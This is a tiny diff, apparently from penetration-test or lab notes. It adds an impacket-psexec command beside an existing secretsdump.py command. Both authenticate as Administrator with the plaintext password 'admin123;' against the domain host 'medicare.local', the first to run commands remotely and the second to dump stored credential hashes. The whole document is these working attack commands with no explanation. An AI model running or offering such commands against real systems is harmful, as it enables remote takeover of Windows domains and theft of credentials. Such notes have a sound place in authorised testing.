@@ -1,1 +1,4 @@
+
+impacket-psexec Administrator:"admin123;"@medicare.local -dc-ip medicare.local
+
 secretsdump.py medicare.local/Administrator:"admin123;"@medicare.local
